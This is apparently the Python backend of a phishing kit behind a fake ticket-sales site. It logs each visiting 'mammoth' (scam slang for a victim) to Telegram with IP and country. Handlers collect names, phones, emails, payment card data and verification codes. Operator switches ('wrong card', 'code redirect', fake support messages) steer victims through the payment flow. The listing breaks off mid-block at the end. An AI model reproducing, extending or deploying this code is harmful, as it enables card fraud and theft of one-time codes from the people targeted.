#!/usr/bin/env python3

import http.server
import socketserver
import os
import sys
import time
from urllib.parse import urlparse, unquote, parse_qs
import requests
import sqlite3
import traceback
import json
from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
from config import PAYMENT_GROUP_ID
import logging
from functools import wraps
import threading

# Настройки сервера
PORT = 8080  # Стандартный HTTP порт
DIRECTORY = "events-art.com"  # Папка з сайтом

# --- Country code to full name mapping ---
COUNTRY_NAMES = {
    'UA': 'Ukraine',
    'RU': 'Russia',
    'PL': 'Poland',
    'DE': 'Germany',
    'FR': 'France',
    'IT': 'Italy',
    'ES': 'Spain',
    'GB': 'United Kingdom',
    'US': 'United States',
    'NL': 'Netherlands',
    'TR': 'Turkey',
    'KZ': 'Kazakhstan',
    'BY': 'Belarus',
    'LT': 'Lithuania',
    'LV': 'Latvia',
    'EE': 'Estonia',
    'CZ': 'Czech Republic',
    'SK': 'Slovakia',
    'RO': 'Romania',
    'MD': 'Moldova',
    'GE': 'Georgia',
    'AM': 'Armenia',
    'AZ': 'Azerbaijan',
    'BG': 'Bulgaria',
    'GR': 'Greece',
    'HU': 'Hungary',
    'FI': 'Finland',
    'SE': 'Sweden',
    'NO': 'Norway',
    'DK': 'Denmark',
    'BE': 'Belgium',
    'CH': 'Switzerland',
    'AT': 'Austria',
    'IE': 'Ireland',
    'PT': 'Portugal',
    'HR': 'Croatia',
    'RS': 'Serbia',
    'SI': 'Slovenia',
    'BA': 'Bosnia and Herzegovina',
    'ME': 'Montenegro',
    'MK': 'North Macedonia',
    'AL': 'Albania',
    'LU': 'Luxembourg',
    'LI': 'Liechtenstein',
    'IS': 'Iceland',
    'CA': 'Canada',
    'AU': 'Australia',
    'NZ': 'New Zealand',
    # ... додайте інші країни за потреби ...
}

# --- In-memory storage for request_again flags ---
REQUEST_AGAIN_FLAGS = {}
# --- In-memory blacklist and wrong_card flags ---
BLACKLISTED_IPS = set()
WRONG_CARD_FLAGS = {}
CODE_REDIRECT_FLAGS = {}
# --- In-memory storage for custom texts ---
CUSTOM_TEXTS = {}
# --- In-memory storage for support flags ---
SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
# --- In-memory storage for push flags ---
PUSH_FLAGS = {}
# Глобальные переменные для флагов
USER_SESSIONS = {}  # ip: timestamp для отслеживания сессий
# --- In-memory storage for ignoring first visit to new pages ---
IGNORE_FIRST_VISIT_PAGE_CODES = set()  # page_code: для ігнорування першого переходу

def clear_old_flags():
    """Очищает старые флаги для неактивных пользователей"""
    current_time = time.time()
    expired_ips = []
    
    # Очищаем старые сессии
    for ip, timestamp in USER_SESSIONS.items():
        if current_time - timestamp > 300:  # 5 минут
            expired_ips.append(ip)
    
    # Удаляем старые сессии
    for ip in expired_ips:
        del USER_SESSIONS[ip]
        if ip in SUPPORT_FLAGS:
            del SUPPORT_FLAGS[ip]
            print(f"[clear_old_flags] Cleared expired session and flags for IP: {ip}")
    
    # Очищаем push флаги старше 5 минут
    expired_pages = []
    for page_code, timestamp in PUSH_FLAGS.items():
        if isinstance(timestamp, (int, float)) and current_time - timestamp > 300:
            expired_pages.append(page_code)
    
    for page_code in expired_pages:
        del PUSH_FLAGS[page_code]
        print(f"[clear_old_flags] Cleared expired push flag for page_code: {page_code}")

# --- Додаю функцію для ігнорування першого переходу ---
def add_ignore_first_visit(page_code):
    """Додає page_code до списку для ігнорування першого переходу"""
    if page_code:
        IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
        print(f"[IGNORE_FIRST_VISIT] Added {page_code} to ignore list")

# --- Глобальний флаг для платіжки ---
PAYMENT_DISABLED = False

# --- Logging setup ---
logging.basicConfig(
    filename='server.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
    datefmt='\%Y-\%m-\%d \%H:\%M:\%S'
)

def log_function(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        logging.info(f'start | args={args} kwargs={kwargs}')
        try:
            result = func(*args, **kwargs)
            logging.info(f'success | result={result}')
            return result
        except Exception as e:
            logging.error(f'error | Exception: {e}', exc_info=True)
            raise
    return wrapper

@log_function
def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=False):
    # Визначаємо країну за IP, якщо не передано
    if not country:
        try:
            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=1)
            if resp.status_code == 200:
                data = resp.json()
                country = data.get("country", "")
        except Exception:
            country = ""
    # Перетворюємо код країни на повну назву
    country_full = COUNTRY_NAMES.get(country, country)
    msg = (
        f"⚠️ Мамонт открыл страницу\n"
        f"📄 Страница: {page}\n"
        f"🔗 Ссылка: {link}\n"
        f"🌍 IP: {ip}\n"
        f"🌏 Страна: {country_full}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    data_group = {"chat_id": GROUP_ID, "text": msg}
    data_group2 = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
    try:
        if important:
            requests.post(url, data=data_group, timeout=1)
            requests.post(url, data=data_group2, timeout=1)
        requests.post(url, data=data_admin, timeout=1)
    except Exception as e:
        print(f"❌ Не вдалося надіслати лог у Telegram: {e}")

def send_telegram_log_async(page, link, ip, country="", extra_user_id=None, important=False):
    try:
        threading.Thread(
            target=send_telegram_log,
            args=(page, link, ip),
            kwargs={
                'country': country,
                'extra_user_id': extra_user_id,
                'important': important,
            },
            daemon=True
        ).start()
    except Exception as e:
        print(f"[async_log] Failed to start log thread: {e}")

def get_real_ip(handler):
    xff = handler.headers.get('X-Forwarded-For')
    if xff:
        return xff.split(',')[0].strip()
    return handler.client_address[0]

# Додаємо допоміжну функцію для отримання page_code по user_id
import requests

def get_user_id_by_page_code(page_code):
    try:
        resp = requests.get(f'http://127.0.0.1:8081/api/user_id_by_page_code?page={page_code}', timeout=2)
        if resp.status_code == 200:
            return resp.json().get('user_id')
    except Exception as e:
        print(f'[server.py] Error getting user_id for page_code={page_code}: {e}')
    return None

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # Добавляем CORS заголовки для безопасности
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        
        # Кешування: HTML не кешуємо, статичні файли віддаємо з довгим кешем
        try:
            path_value = getattr(self, 'path', '') or ''
            if isinstance(path_value, bytes):
                path_value = path_value.decode('utf-8', errors='ignore')
            if path_value.endswith('.html') or path_value.endswith('/') or ('?' in path_value):
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.send_header('Pragma', 'no-cache')
                self.send_header('Expires', '0')
            else:
                static_exts = (
                    '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
                    '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
                    '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
                )
                if any(path_value.endswith(ext) for ext in static_exts):
                    self.send_header('Cache-Control', 'public, max-age=31536000, immutable')
        except Exception:
            pass
        
        super().end_headers()
    
    def is_blocked(self):
        # Використовуємо реальний IP з X-Forwarded-For для коректної роботи за проксі/CDN
        ip = get_real_ip(self)
        return ip in BLACKLISTED_IPS

    @log_function
    def do_GET(self):
        qs = {}
        if '?' in self.path:
            qs = parse_qs(self.path.split('?', 1)[1])
        # --- Блокування IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.wfile.write('<html><body><h2>Your IP has been blocked by the administrator.</h2></body></html>'.encode('utf-8'))
            return
        print(f"GET: {self.path}")  # Логування всіх GET-запитів
        path = unquote(self.path.split('?', 1)[0])
        orig_path = path
        # Якщо файл не знайдено, але є параметри — повертаємо index.html з відповідної папки
        fs_path = self.translate_path(path)
        if not os.path.exists(fs_path):
            if path.endswith('/'):
                path += 'index.html'
            elif not path.endswith('.html'):
                path += '/index.html'
            fs_path = self.translate_path(path)
            if os.path.exists(fs_path):
                self.path = path
        if orig_path.startswith('/file/ticket/'):
            filename = orig_path[len('/file/ticket/'):]
            ticket_path = os.path.join('tickets', filename)
            if os.path.exists(ticket_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'inline; filename=\"{filename}\"')
                self.end_headers()
                with open(ticket_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, 'Ticket not found')
            return
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # Якщо це ресурс — не логувати
        if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
            return super().do_GET()
        # --- NEW: If ?page=page_code in URL, update IP in database ---
        page_code_for_ip = None
        if 'page' in qs:
            page_code_for_ip = qs['page'][0]
            # Оновлюємо IP у базі даних
            if page_code_for_ip:
                ip = get_real_ip(self)
                try:
                    requests.post('http://127.0.0.1:8081/update_site_user_ip', json={
                        'page_code': page_code_for_ip,
                        'ip': ip
                    }, timeout=2)
                    print(f"[IP Update] Updated IP for page_code: {page_code_for_ip}, IP: {ip}")
                except Exception as e:
                    print(f"[IP Update] Error updating IP: {e}")
        # --- END NEW ---
        # --- NEW: If ?page=code in URL, try to find event creator ---
        extra_user_id = None
        if 'page' in qs:
            page_code = qs['page'][0]
            if page_code:
                try:
                    db = sqlite3.connect('users.db')
                    cur = db.cursor()
                    # Спочатку шукаємо в event_links (для нових записів)
                    cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
                    row = cur.fetchone()
                    if row:
                        extra_user_id = row[0]
                        print(f"[DB] Found user_id {extra_user_id} in event_links for page_code: {page_code}")
                    else:
                        # Якщо не знайдено в event_links, шукаємо в site_users
                        cur.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
                        row = cur.fetchone()
                        if row:
                            extra_user_id = row[0]
                            print(f"[DB] Found user_id {extra_user_id} in site_users for page_code: {page_code}")
                        else:
                            print(f"[DB] Page code {page_code} not found in any table")
                    db.close()
                except Exception as e:
                    print(f"[DB] Error fetching event creator: {e}")
        # --- END NEW ---
        # Нормалізуємо шлях для унікальності
        norm_path = orig_path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # Логувати тільки якщо це основна сторінка
        should_log = (
            norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
        )
        # --- LOGIC CHANGE: always log to event creator if ?page=code, regardless of should_log ---
        ip = get_real_ip(self)
        
        # Перевіряємо, чи потрібно ігнорувати перший перехід для цього page_code
        page_code = qs.get('page', [None])[0]
        should_ignore_first_visit = page_code and page_code in IGNORE_FIRST_VISIT_PAGE_CODES
        
        if extra_user_id:
            print(f"📝 Логуємо відкриття сторінки для event creator: {norm_path}")
            # Non-blocking log
            send_telegram_log_async(
                page=norm_path,
                link=self.path,
                ip=ip,
                extra_user_id=extra_user_id
            )
        
        # Група та адмін — як і раніше, тільки для основних сторінок
        if should_log and not should_ignore_first_visit:
            if not hasattr(self.server, 'logged_paths'):
                self.server.logged_paths = set()
            if norm_path not in self.server.logged_paths:
                self.server.logged_paths.add(norm_path)
                print(f"📝 Логуємо відкриття сторінки: {norm_path}")
                # Non-blocking log
                send_telegram_log_async(
                    page=norm_path,
                    link=self.path,
                    ip=ip
                )
        
        # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
        if should_ignore_first_visit:
            IGNORE_FIRST_VISIT_PAGE_CODES.discard(page_code)
            print(f"[IGNORE_FIRST_VISIT] Removed {page_code} from ignore list after first visit")
        # --- Додаємо обробку /check_request_again ---
        if self.path.startswith('/check_request_again'):
            code = qs.get('code', [None])[0]
            print(f"[check_request_again][GET] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                print(f"[check_request_again][GET] Returning true for code: {code}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        # --- Wrong card polling ---
        if self.path.startswith('/check_wrong_card'):
            ip = qs.get('ip', [None])[0]
            if ip and WRONG_CARD_FLAGS.get(ip):
                WRONG_CARD_FLAGS[ip] = False
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        if self.path.startswith('/check_code_redirect'):
            ip = qs.get('ip', [None])[0]
            if ip and CODE_REDIRECT_FLAGS.get(ip):
                CODE_REDIRECT_FLAGS[ip] = False
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        if self.path.startswith('/get_custom_text'):
            text_id = qs.get('text_id', [None])[0]
            text = CUSTOM_TEXTS.get(text_id, '')
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.end_headers()
            # Повертаємо чистий текст без JSON/лапок
            self.wfile.write((text or '').encode('utf-8'))
            return
        if self.path.startswith('/check_support'):
            # Очищаем старые флаги
            clear_old_flags()
            
            ip = qs.get('ip', [None])[0]
            current_time = time.time()
            
            # Сбрасываем флаги для новых пользователей (если IP не был активен в последние 5 минут)
            if ip in USER_SESSIONS:
                session_age = current_time - USER_SESSIONS[ip]
                if session_age > 300:  # 5 минут
                    if ip in SUPPORT_FLAGS:
                        del SUPPORT_FLAGS[ip]
                        print(f"[check_support] Reset flags for new user session: {ip}")
            else:
                # Если это первый раз для этого IP, очищаем старые флаги
                if ip in SUPPORT_FLAGS:
                    del SUPPORT_FLAGS[ip]
                    print(f"[check_support] First time for IP, cleared flags: {ip}")
            
            # Обновляем время сессии
            USER_SESSIONS[ip] = current_time
            
            flag = SUPPORT_FLAGS.get(ip, {}) if ip else {}
            print(f"[check_support] IP: {ip}, flags: {flag}")
            
            # ВАЖНО: Проверяем флаг и помечаем как использованный
            response_data = {
                'show_support': bool(flag.get('support') and not flag.get('used', True)),
                'show_text': bool(flag.get('text_id') and not flag.get('used', True)),
                'text_id': flag.get('text_id', '') if not flag.get('used', True) else ''
            }
            
            # Помечаем флаг как использованный или удаляем
            if flag.get('support') or flag.get('text_id'):
                if not flag.get('used', True):
                    # Помечаем как использованный
                    SUPPORT_FLAGS[ip] = {**flag, 'used': True}
                    print(f"[check_support] Flag marked as used for IP: {ip}")
                else:
                    # Удаляем использованный флаг
                    del SUPPORT_FLAGS[ip]
                    print(f"[check_support] Used flag cleared for IP: {ip}")
            
            print(f"[check_support] Response: {response_data}")
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response_data).encode('utf-8'))
            return
        if self.path.startswith('/reset_support_flag'):
            ip = qs.get('ip', [None])[0]
            if ip and ip in SUPPORT_FLAGS:
                del SUPPORT_FLAGS[ip]
                print(f"[reset_support_flag] Cleared support flag for IP: {ip}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')
            return
        if self.path.startswith('/check_push'):
            page_code = qs.get('page_code', [None])[0]
            print(f'[check_push] page_code: {page_code}, flag: {PUSH_FLAGS.get(page_code)}')
            if page_code and page_code in PUSH_FLAGS:
                flag_data = PUSH_FLAGS[page_code]
                if isinstance(flag_data, dict) and not flag_data.get('used', True):
                    # Помечаем как использованный
                    PUSH_FLAGS[page_code] = {'used': True}
                    print(f'[check_push] Push flag used for page_code: {page_code}')
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'true')
                else:
                    # Удаляем использованный флаг
                    del PUSH_FLAGS[page_code]
                    print(f'[check_push] Push flag cleared for page_code: {page_code}')
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'false')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        
        # --- API проксування до бекенду ---
        if self.path.startswith('/api/'):
            try:
                # Проксуємо запит до бекенду на порту 8081
                backend_url = f"http://127.0.0.1:8081{self.path}"
                print(f"[API Proxy] Proxying {self.path} to {backend_url}")
                
                response = requests.get(backend_url, timeout=5)
                
                # Копіюємо заголовки відповіді
                self.send_response(response.status_code)
                for header, value in response.headers.items():
                    if header.lower() not in ['transfer-encoding', 'connection']:
                        self.send_header(header, value)
                self.end_headers()
                
                # Відправляємо тіло відповіді
                self.wfile.write(response.content)
                return
            except Exception as e:
                print(f"[API Proxy] Error proxying to backend: {e}")
                self.send_error(502, f"Backend Error: {e}")
                return
        
        # --- Endpoint для зміни флагу (GET/POST) ---
        if self.path.startswith('/set_payment_disabled'):
            val = qs.get('value', [None])[0]
            global PAYMENT_DISABLED
            if val == '1':
                PAYMENT_DISABLED = True
                print('[PAYMENT] Disabled')
            elif val == '0':
                PAYMENT_DISABLED = False
                print('[PAYMENT] Enabled')
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')
            return
        # --- Блокування платіжних сторінок ---
        def is_payment_url(path):
            return (
                path.startswith('/buy-tickets/loading/') or
                path.startswith('/buy-tickets/code/') or
                path.startswith('/buy-tickets/loading/waiting-support.html') or
                path.startswith('/buy-tickets/loading/waiting-text.html')
            )

        if PAYMENT_DISABLED and is_payment_url(self.path):
            with open('events-art.com/buy-tickets/payment-unavailable/Site Maintenance.html', 'rb') as f:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
            return
        if self.path.startswith('/clear_logs'):
            try:
                with open('server.log', 'w') as f:
                    f.truncate(0)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode('utf-8'))
            return
        try:
            super().do_GET()
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {e}")

    def do_OPTIONS(self):
        # Обробка CORS preflight запитів
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    @log_function
    def do_POST(self):
        path = unquote(self.path.split('?' ,1)[0])
        # --- Блокування IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.wfile.write('BLOCKED'.encode('utf-8'))
            return
        
        # --- API проксування до бекенду ---
        if path.startswith('/api/'):
            try:
                # Читаємо тіло запиту
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length) if content_length > 0 else b''
                
                # Проксуємо запит до бекенду на порту 8081
                backend_url = f"http://127.0.0.1:8081{self.path}"
                print(f"[API Proxy POST] Proxying {self.path} to {backend_url}")
                
                # Відправляємо POST запит до бекенду
                response = requests.post(backend_url, data=post_data, headers={
                    'Content-Type': self.headers.get('Content-Type', 'application/json')
                }, timeout=5)
                
                # Копіюємо заголовки відповіді
                self.send_response(response.status_code)
                for header, value in response.headers.items():
                    if header.lower() not in ['transfer-encoding', 'connection']:
                        self.send_header(header, value)
                self.end_headers()
                
                # Відправляємо тіло відповіді
                self.wfile.write(response.content)
                return
            except Exception as e:
                print(f"[API Proxy POST] Error proxying to backend: {e}")
                self.send_error(502, f"Backend Error: {e}")
                return
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = get_real_ip(self)
                # Non-blocking log
                send_telegram_log_async(page=page, link=link, ip=ip)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        # Оновлені обробники POST-запитів для page_code
        elif path == '/submit_form':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                phone = data.get('phone', '')
                name = data.get('name', '')
                mail = data.get('mail', '')
                page_code = data.get('page_code', '')
                user_id = data.get('user_id', '')
                if not page_code and user_id:
                    page_code = get_user_id_by_page_code(user_id)
                ip = get_real_ip(self)
                # Надсилаємо у main.py
                try:
                    requests.post('http://localhost:8081/notify_admin', json={
                        'phone': phone,
                        'name': name,
                        'mail': mail,
                        'ip': ip,
                        'page_code': page_code
                    }, timeout=2)
                except Exception as e:
                    print(f"[notify_admin] Error: {e}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        elif path == '/send_payment_data':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code', '')
                user_id = data.get('user_id', '')
                if not page_code and user_id:
                    page_code = get_user_id_by_page_code(user_id)
                # Видаляємо user_id, передаємо тільки page_code
                data.pop('user_id', None)
                data['page_code'] = page_code
                print("[send_payment_data] Отримано дані:", data)
                resp = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=3)
                print(f"[send_payment_data] Відповідь від main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_payment_data] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/send_code':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                print("[send_code] Отримано код:", data)
                resp = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=3)
                print(f"[send_code] Відповідь від main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_code] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/set_request_again':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                code = data.get('code')
                if code:
                    REQUEST_AGAIN_FLAGS[code] = True
                    print(f"[set_request_again] Set flag for code: {code}")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no code')
            except Exception as e:
                print(f"[set_request_again] Error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/ignore_first_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code')
                if page_code:
                    add_ignore_first_visit(page_code)
                    print(f"[ignore_first_visit] Added {page_code} to ignore list")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no page_code')
            except Exception as e:
                print(f"[ignore_first_visit] Error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path.startswith('/check_request_again'):
            code = qs.get('code', [None])[0]
            print(f"[check_request_again] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                print(f"[check_request_again] Returning true for code: {code}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        elif path == '/admin_action':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                action = data.get('action')
                ip = data.get('ip')
                # --- Тільки тут надсилаємо в обидві групи ---
                if action in ['block', 'card', 'code'] and ip:
                    # Non-blocking important log
                    send_telegram_log_async(page=action, link='', ip=ip, important=True)
                if action == 'block' and ip:
                    BLACKLISTED_IPS.add(ip)
                    print(f'[admin_action] Blocked IP: {ip}')
                elif action == 'unblock' and ip:
                    BLACKLISTED_IPS.discard(ip)
                    print(f'[admin_action] Unblocked IP: {ip}')
                elif action == 'card' and ip:
                    WRONG_CARD_FLAGS[ip] = True
                    print(f'[admin_action] Wrong card for IP: {ip}')
                elif action == 'code' and ip:
                    CODE_REDIRECT_FLAGS[ip] = True
                    print(f'[admin_action] Code redirect for IP: {ip}')
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print(f'[admin_action] Error: {e}')
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif self.path == '/set_custom_text':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                text_id = data.get('text_id')
                text = data.get('text')
                if text_id and text is not None:
                    CUSTOM_TEXTS[text_id] = text
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no text_id or text')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif self.path == '/set_support_flag':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                ip = data.get('ip')
                flag_type = data.get('type')  # 'support' або 'text'
                text_id = data.get('text_id')
                print(f"[set_support_flag] IP: {ip}, type: {flag_type}, text_id: {text_id}")
                
                # Очищаем старые флаги
                clear_old_flags()
                
                # Очищаем ВСЕ старые флаги перед установкой нового
                SUPPORT_FLAGS.clear()
                print(f"[set_support_flag] Cleared all old support flags")
                
                if ip and flag_type == 'support':
                    SUPPORT_FLAGS[ip] = {'support': True, 'used': False}
                    print(f"[set_support_flag] Set support flag ONLY for IP: {ip}")
                elif ip and flag_type == 'text' and text_id:
                    SUPPORT_FLAGS[ip] = {'text_id': text_id, 'used': False}
                    print(f"[set_support_flag] Set text flag ONLY for IP: {ip} with text_id: {text_id}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print(f"[set_support_flag] Error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/update_site_user_ip':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code', '')
                user_id = data.get('user_id', '')
                ip = data.get('ip', '')
                if not page_code and user_id:
                    page_code = get_user_id_by_page_code(user_id)
                # Надсилаємо у main.py
                try:
                    requests.post('http://localhost:8081/update_site_user_ip', json={
                        'page_code': page_code,
                        'ip': ip
                    }, timeout=2)
                except Exception as e:
                    print(f"[update_site_user_ip] Error: {e}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
            return
        elif path.startswith('/api/payment_data'):
            page_code = qs.get('page', [None])[0]
            if not page_code:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'{"error": "missing page"}')
                return
            c = get_db().cursor()
            c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
            row = c.fetchone()
            if not row:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'{"error": "not found"}')
                return
            price, currency, street = row
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'price': price, 'currency': currency, 'street': street}).encode('utf-8'))
            return
        elif path == '/set_push_flag':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code')
                if page_code:
                    # Очищаем старые флаги
                    clear_old_flags()
                    # Очищаем ВСЕ старые push флаги перед установкой нового
                    PUSH_FLAGS.clear()
                    print(f'[set_push_flag] Cleared all old push flags')
                    
                    PUSH_FLAGS[page_code] = {'used': False}
                    print(f'[set_push_flag] Set push flag ONLY for page_code: {page_code}')
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no page_code')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return

        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    # Очищаем старые флаги при запуске
    SUPPORT_FLAGS.clear()
    PUSH_FLAGS.clear()
    USER_SESSIONS.clear()
    CUSTOM_TEXTS.clear()
    print("🧹 Очищены старые флаги при запуске сервера")
    
    # Добавляем все существующие page_code в список игнорирования первого лога
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute('SELECT page_code FROM site_users WHERE page_code IS NOT NULL')
        existing_page_codes = [row[0] for row in c.fetchall()]
        conn.close()
        
        for page_code in existing_page_codes:
            IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
        
        print(f"📝 Добавлено {len(existing_page_codes)} существующих page_code в список игнорирования первого лога")
    except Exception as e:
        print(f"⚠️ Ошибка при добавлении существующих page_code: {e}")
    
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.ThreadingTCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"🌐 Сервер запущений на порту {PORT}")
